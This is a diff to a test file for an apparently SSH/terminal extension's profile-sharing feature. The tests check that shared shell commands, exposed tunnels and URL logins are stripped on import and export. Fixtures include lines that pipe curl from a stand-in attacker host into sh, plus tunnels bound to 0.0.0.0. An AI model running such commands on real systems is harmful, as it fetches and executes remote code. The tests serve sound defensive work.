@@ -816,7 +816,7 @@ function everyLocalShellField(): LocalShellProfile {
     id: "sh-1",
     name: "Build shell",
     group: "Dev",
-    launchMode: "custom",
+    launchMode: "vscodeProfile",
     vscodeProfileName: "bash",
     shellPath: "/bin/bash",
     shellArgs: ["-l"],
@@ -872,11 +872,11 @@ const SHIPPED_SERVER_KEYS = [
   "openFileExplorerOnFirstConnect", "origin", "port", "protocol", "proxy", "username"
 ];
 const SHIPPED_TUNNEL_KEYS = [
-  "autoStart", "autoStop", "browserUrl", "connectionMode", "defaultServerId", "id", "localBindAddress", "localPort",
+  "autoStart", "autoStop", "browserUrl", "connectionMode", "defaultServerId", "id", "localPort",
   "localTargetIP", "name", "notes", "remoteBindAddress", "remoteIP", "remotePort", "tunnelType"
 ];
 const SHIPPED_SERIAL_KEYS = ["baudRate", "dataBits", "group", "id", "logSession", "mode", "name", "parity", "path", "rtscts", "stopBits"];
-const SHIPPED_LOCAL_SHELL_KEYS = ["group", "id", "launchMode", "name", "shellArgs", "shellPath", "vscodeProfileName"];
+const SHIPPED_LOCAL_SHELL_KEYS = ["group", "id", "launchMode", "name", "vscodeProfileName"];
 const SHIPPED_MACRO_KEYS = [
   "group", "id", "keybinding", "name", "provideIpmiCredentials", "route", "runIn", "secret", "slot", "text", "triggerCooldown",
   "triggerInitiallyDisabled", "triggerInterval", "triggerPattern", "triggerProfileId", "triggerScope", "variables"
@@ -1684,7 +1684,7 @@ describe("share import — synced servers", () => {
     // As the previous release's exporter wrote them: what it clears is already absent or blank.
     const oldServer = makeServer({ id: "old-1", name: "Old Router", username: "user", authType: "key", keyPath: "" });
     const oldSerial = { id: "old-ser", name: "Console", path: "/dev/ttyUSB0", baudRate: 9600, dataBits: 8, stopBits: 1, parity: "none", rtscts: false };
-    const oldShell = { id: "old-ls", name: "Build shell", launchMode: "custom", shellPath: "/bin/bash", shellArgs: ["-l"] };
+    const oldShell = { id: "old-ls", name: "Build shell", launchMode: "vscodeProfile", vscodeProfileName: "bash" };
     const oldShare = JSON.stringify({
       version: 2,
       exportType: "share",
@@ -1775,8 +1775,8 @@ describe("share import — what the export clears, cleared again", () => {
           {
             id: "ls-1",
             name: "Build shell",
-            launchMode: "custom",
-            shellPath: "/bin/bash",
+            launchMode: "vscodeProfile",
+            vscodeProfileName: "bash",
             cwd: "/home/bob/secret-project",
             startupCommand: "curl https://attacker.example.com/x | sh",
             env: { API_TOKEN: "FILE-TOKEN" }
@@ -1786,7 +1786,7 @@ describe("share import — what the export clears, cleared again", () => {
     );
 
     const [profile] = recipient.core.getSnapshot().localShellProfiles;
-    expect(profile).toMatchObject({ name: "Build shell", launchMode: "custom", shellPath: "/bin/bash" });
+    expect(profile).toMatchObject({ name: "Build shell", launchMode: "vscodeProfile", vscodeProfileName: "bash" });
     for (const key of ["cwd", "startupCommand", "env"]) {
       expect(profile).not.toHaveProperty(key);
     }
@@ -2043,7 +2043,7 @@ describe("share round trip — the recipient's first sync adopts the cached tree
     { label: "absent serial profile", bucket: "serialProfiles", id: "missing-serial" },
     { label: "rejected serial profile", bucket: "serialProfiles", id: "rejected-serial", record: (id) => ({ ...everySerialField(), id, path: "" }) },
     { label: "absent Local Shell profile", bucket: "localShellProfiles", id: "missing-shell" },
-    { label: "rejected Local Shell profile", bucket: "localShellProfiles", id: "rejected-shell", record: (id) => ({ ...everyLocalShellField(), id, shellPath: "" }) }
+    { label: "rejected Local Shell profile", bucket: "localShellProfiles", id: "rejected-shell", record: (id) => ({ ...everyLocalShellField(), id, vscodeProfileName: "" }) }
   ];
 
   it.each(unavailableTriggerTargets)("strips every trigger setting for a direct share with an $label target, preserving the macro", async ({ bucket, id, record }) => {
@@ -2385,5 +2385,240 @@ describe("share round trip — the recipient's first sync adopts the cached tree
     expect(getMacros().map((macro) => macro.name)).toContain("Shared macro");
     expect(getMacros().map((macro) => macro.name)).not.toContain("Secret macro");
     expect(lastInfoMessage()).toContain("(2 skipped).");
+  });
+});
+
+describe("a share never hands over a shell command or an unattended tunnel (#254, #255)", () => {
+  const customShell = {
+    id: "x",
+    name: "Team build shell",
+    launchMode: "custom",
+    shellPath: "/bin/sh",
+    shellArgs: ["-c", "curl -fsS https://attacker.example.com/p | sh; exec bash -l"]
+  };
+  const hostileTunnels = [
+    { id: "t1", name: "socks", tunnelType: "dynamic", localPort: 1080, remoteIP: "0.0.0.0", remotePort: 0, localBindAddress: "0.0.0.0", defaultServerId: "s1", autoStart: true, connectionMode: "shared" },
+    { id: "t2", name: "rev", tunnelType: "reverse", localPort: 22, remoteIP: "0.0.0.0", remotePort: 2222, remoteBindAddress: "0.0.0.0", localTargetIP: "10.0.0.5", defaultServerId: "s1", autoStart: true },
+    { id: "t3", name: "web", localPort: 18080, remoteIP: "127.0.0.1", remotePort: 80, defaultServerId: "s1", autoStart: false, browserUrl: "http://admin:secret@localhost:{localPort}/" },
+    { id: "t5", name: "blank", localPort: 18082, remoteIP: "127.0.0.1", remotePort: 82, defaultServerId: "s1", autoStart: false, remoteBindAddress: "" },
+    { id: "t4", name: "kept", localPort: 18081, remoteIP: "127.0.0.1", remotePort: 81, defaultServerId: "s1", autoStart: false, remoteBindAddress: "127.0.0.1", browserUrl: "http://localhost:{localPort}/a@b" }
+  ];
+
+  it("import: a custom Local Shell profile is not imported, counted, and named with its remedy; a VS Code profile still lands (⊘ shellPath/shellArgs \"keep\", which lands the command line)", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({ localShellProfiles: [customShell, { id: "v", name: "Bash", launchMode: "vscodeProfile", vscodeProfileName: "bash", shellPath: "/bin/sh", shellArgs: ["-c", "x"] }] })
+    );
+
+    const profiles = recipient.core.getSnapshot().localShellProfiles;
+    expect(profiles.map((p) => p.name)).toEqual(["Bash"]);
+    expect(JSON.stringify(profiles)).not.toMatch(/attacker|shellArgs|shellPath/);
+    expect(lastInfoMessage()).toContain("Imported 1 profiles.");
+    expect(lastInfoMessage()).toContain("1 custom Local Shell profile not imported");
+    expect(lastInfoMessage()).toContain("Add Local Shell Profile");
+  });
+
+  it("export: custom Local Shell profiles are left out and counted (⊘ shipping the sender's command line and absolute paths)", () => {
+    const result = sanitizeForSharing([], [], [], [customShell as unknown as LocalShellProfile, everyLocalShellField()]);
+    expect(result.localShellProfiles).toHaveLength(1);
+    expect(result.omittedLocalShellProfiles).toBe(1);
+    expect(JSON.stringify(result)).not.toMatch(/attacker|\/bin\/sh|shellArgs|shellPath/);
+  });
+
+  it("export message names the omitted custom Local Shell profiles", async () => {
+    const sender = await makeMachine();
+    await sender.core.addOrUpdateLocalShellProfile(customShell as unknown as LocalShellProfile);
+    const written = await exportShare(sender);
+    expect(JSON.parse(written).localShellProfiles).toEqual([]);
+    expect(lastInfoMessage()).toContain("1 custom Local Shell profile left out");
+    expect(lastInfoMessage()).toContain("Add Local Shell Profile");
+  });
+
+  it("import: tunnels arrive with auto-start off, no listener address, loopback-only remote bind and no URL login (⊘ every one of them kept)", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({
+        servers: [makeServer({ id: "s1", name: "lab-bastion", username: "user" })],
+        tunnels: hostileTunnels
+      })
+    );
+
+    const tunnels = recipient.core.getSnapshot().tunnels;
+    expect(tunnels).toHaveLength(5);
+    for (const tunnel of tunnels) {
+      expect(tunnel.autoStart).toBe(false);
+      expect(tunnel.localBindAddress).toBeUndefined();
+    }
+    const byName = (name: string) => tunnels.find((t) => t.name === name)!;
+    expect(byName("rev").remoteBindAddress).toBeUndefined();
+    expect(byName("rev").localTargetIP).toBe("10.0.0.5");
+    expect(byName("kept").remoteBindAddress).toBe("127.0.0.1");
+    expect(byName("web").browserUrl).toBe("http://localhost:{localPort}/");
+    expect(byName("kept").browserUrl).toBe("http://localhost:{localPort}/a@b");
+    expect(JSON.stringify(tunnels)).not.toContain("secret@");
+    expect(lastInfoMessage()).toContain("4 tunnels arrived adjusted (auto-start off, loopback-only listener, no login in its browser URL)");
+  });
+
+  it("import: a tunnel changed only by its browser URL login is counted (⊘ counting auto-start and bind addresses alone)", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({
+        tunnels: [
+          { id: "b1", name: "only-url", localPort: 18090, remoteIP: "127.0.0.1", remotePort: 80, autoStart: false, browserUrl: "http://admin:secret@localhost:{localPort}/" },
+          { id: "b2", name: "clean", localPort: 18091, remoteIP: "127.0.0.1", remotePort: 81, autoStart: false, browserUrl: "http://localhost:{localPort}/" }
+        ]
+      })
+    );
+
+    expect(lastInfoMessage()).toContain("1 tunnel arrived adjusted");
+    expect(recipient.core.getSnapshot().tunnels.find((t) => t.name === "only-url")!.browserUrl).toBe("http://localhost:{localPort}/");
+  });
+
+  it("a remote bind address is kept only when it is a valid loopback address (⊘ /^127(\\.\\d{1,3}){3}$/, which accepts 127.256.0.1)", () => {
+    const [t] = hostileTunnels;
+    const bind = (remoteBindAddress: string) =>
+      sanitizeForSharing([], [{ ...t, remoteBindAddress } as unknown as TunnelProfile], [], []).tunnels[0].remoteBindAddress;
+    for (const invalid of ["127.256.0.1", "127.999.999.999", "127.0.0.256", "127.01.0.1", "127.0.0", "127.0.0.1.1", "127.0.0.-1"]) {
+      expect(bind(invalid)).toBeUndefined();
+    }
+    for (const valid of ["127.0.0.1", "127.255.255.255", "127.0.0.2", "localhost", "::1"]) {
+      expect(bind(valid)).toBe(valid);
+    }
+    // Padding never reaches the SSH server: the normalized host is what is kept.
+    expect(bind(" localhost ")).toBe("localhost");
+    expect(bind(" 127.0.0.1\t")).toBe("127.0.0.1");
+    // Bracketed IPv6 is normalized to the bare address SSH expects.
+    expect(bind("[::1]")).toBe("::1");
+    expect(bind(" [::1] ")).toBe("::1");
+    expect(bind("[::2]")).toBeUndefined();
+    // Every spelling of ::1 is kept, as the canonical address.
+    for (const spelling of ["0:0:0:0:0:0:0:1", "0000::1", "0:0::1", "0000:0000:0000:0000:0000:0000:0000:0001", "::0001", "[0:0:0:0:0:0:0:1]", "::1"]) {
+      expect(bind(spelling)).toBe("::1");
+    }
+    // Other addresses, IPv4-mapped forms, zone ids and malformed spellings are not loopback.
+    for (const other of ["::2", "0:0:0:0:0:0:0:2", "::", "1::1", "::ffff:127.0.0.1", "::1%lo", "1:::1", "0:0:0:0:0:0:0:0:1", "::1::1"]) {
+      expect(bind(other)).toBeUndefined();
+    }
+  });
+
+  it("import: a tunnel whose only change is a normalized address or a dropped loopback listener address is counted (⊘ counting only non-loopback values)", async () => {
+    const recipient = await makeMachine();
+    const base = { remoteIP: "127.0.0.1", remotePort: 80, autoStart: false };
+    await importShare(
+      recipient,
+      shareJson({
+        tunnels: [
+          { ...base, id: "w1", name: "padded", localPort: 18100, remoteBindAddress: " localhost " },
+          { ...base, id: "w2", name: "loopback-listener", localPort: 18101, localBindAddress: "127.0.0.1" },
+          { ...base, id: "w3", name: "untouched", localPort: 18102, remoteBindAddress: "localhost" }
+        ]
+      })
+    );
+
+    const tunnels = recipient.core.getSnapshot().tunnels;
+    expect(tunnels.find((t) => t.name === "padded")!.remoteBindAddress).toBe("localhost");
+    expect(tunnels.find((t) => t.name === "loopback-listener")!.localBindAddress).toBeUndefined();
+    expect(lastInfoMessage()).toContain("2 tunnels arrived adjusted");
+  });
+
+  it("export: none of auto-start, a bind address or a URL login survives (⊘ \"keep\")", () => {
+    const [t] = hostileTunnels;
+    for (const browserUrl of [
+      "admin:secret@localhost:{localPort}",
+      "//admin:secret@host:{localPort}/x",
+      "https://admin:secret@localhost:{localPort}/?a=b@c",
+      // Forms a browser normalizes into a URL that still carries the login.
+      " http://admin:secret@localhost:{localPort}/",
+      "http:/\\admin:secret@localhost:{localPort}/",
+      "http:////admin:secret@localhost:{localPort}/"
+    ]) {
+      const shared = sanitizeForSharing([], [{ ...t, browserUrl } as unknown as TunnelProfile], [], []);
+      expect(shared.tunnels[0].browserUrl).not.toContain("secret@");
+    }
+    // Every candidate stand-in port already present: the URL cannot be rewritten
+    // safely, so it is dropped, never shipped with its login.
+    const crowded = "http:/\\admin:secret@localhost:{localPort}/?x=" + Array.from({ length: 1000 }, (_v, n) => 60000 + n).join(",");
+    const dropped = sanitizeForSharing([], [{ ...t, browserUrl: crowded } as unknown as TunnelProfile], [], []);
+    expect(dropped.tunnels[0].browserUrl).toBeUndefined();
+    expect(JSON.stringify(dropped)).not.toContain("secret");
+    const exact = "http:/\\admin:secret@localhost:{localPort}/?x=65533,65532,65531,65530";
+    const exactOut = sanitizeForSharing([], [{ ...t, browserUrl: exact } as unknown as TunnelProfile], [], []);
+    expect(exactOut.tunnels[0].browserUrl).toBe("http://localhost:{localPort}/?x=65533,65532,65531,65530");
+    // A path or query that merely contains an "@" is not a credential.
+    const plain = sanitizeForSharing([], [{ ...t, browserUrl: "http://localhost:{localPort}/@me?x=a@b" } as unknown as TunnelProfile], [], []);
+    expect(plain.tunnels[0].browserUrl).toBe("http://localhost:{localPort}/@me?x=a@b");
+    const out = sanitizeForSharing(
+      [],
+      [
+        { ...t, localBindAddress: "192.0.2.10", remoteBindAddress: "192.0.2.11", browserUrl: "http://admin:secret@localhost:{localPort}/" } as unknown as TunnelProfile
+      ],
+      [],
+      []
+    );
+    expect(out.tunnels[0].autoStart).toBe(false);
+    expect(JSON.stringify(out)).not.toMatch(/192\.0\.2|secret@/);
+  });
+});
+
+describe("duplicate ids inside one share (#257)", () => {
+  const dup = (name: string, host: string) => ({ id: "dup", name, host, port: 22, username: "u", authType: "password", isHidden: false });
+
+  it("the first server under an id lands; the second is skipped and counted (⊘ the second overwriting the first and both counted)", async () => {
+    const recipient = await makeMachine();
+    await importShare(recipient, shareJson({ servers: [dup("A", "192.0.2.1"), dup("B", "192.0.2.2")] }));
+
+    const servers = recipient.core.getSnapshot().servers;
+    expect(servers.map((s) => s.name)).toEqual(["A"]);
+    expect(lastInfoMessage()).toBe("Imported 1 profiles (1 skipped).");
+  });
+
+  it("the first auth profile under an id lands and a server linked to that id follows it", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({
+        authProfiles: [makeProfile({ id: "ap", name: "First", username: "user" }), makeProfile({ id: "ap", name: "Second", username: "user" })],
+        servers: [makeServer({ id: "s", name: "Linked", username: "user", authProfileId: "ap" })]
+      })
+    );
+
+    const snapshot = recipient.core.getSnapshot();
+    expect(snapshot.authProfiles.map((p) => p.name)).toEqual(["First"]);
+    expect(snapshot.servers[0].authProfileId).toBe(snapshot.authProfiles[0].id);
+    expect(lastInfoMessage()).toBe("Imported 2 profiles (1 skipped).");
+  });
+
+  it("a malformed first row does not reserve the id: the first VALID row under it lands (⊘ reserving the id before validation, which skips both)", async () => {
+    const recipient = await makeMachine();
+    await importShare(recipient, shareJson({ servers: [{ ...dup("Bad", "192.0.2.1"), host: "" }, dup("B", "192.0.2.2"), dup("C", "192.0.2.3")] }));
+
+    expect(recipient.core.getSnapshot().servers.map((s) => s.name)).toEqual(["B"]);
+    expect(lastInfoMessage()).toBe("Imported 1 profiles (2 skipped).");
+  });
+
+  it("same for auth profiles: a malformed first row does not cost the valid second one", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({
+        authProfiles: [{ ...makeProfile({ id: "ap", name: "Bad" }), authType: "nope" }, makeProfile({ id: "ap", name: "Good", username: "user" })],
+        servers: [makeServer({ id: "s", name: "Linked", username: "user", authProfileId: "ap" })]
+      })
+    );
+
+    const snapshot = recipient.core.getSnapshot();
+    expect(snapshot.authProfiles.map((p) => p.name)).toEqual(["Good"]);
+    expect(snapshot.servers[0].authProfileId).toBe(snapshot.authProfiles[0].id);
+  });
+
+  it("two rows with blank ids both import (ensureId gives each its own)", async () => {
+    const recipient = await makeMachine();
+    await importShare(recipient, shareJson({ servers: [{ ...dup("A", "192.0.2.1"), id: "" }, { ...dup("B", "192.0.2.2"), id: "" }] }));
+
+    expect(recipient.core.getSnapshot().servers.map((s) => s.name).sort()).toEqual(["A", "B"]);
+    expect(lastInfoMessage()).toBe("Imported 2 profiles.");
   });
 });
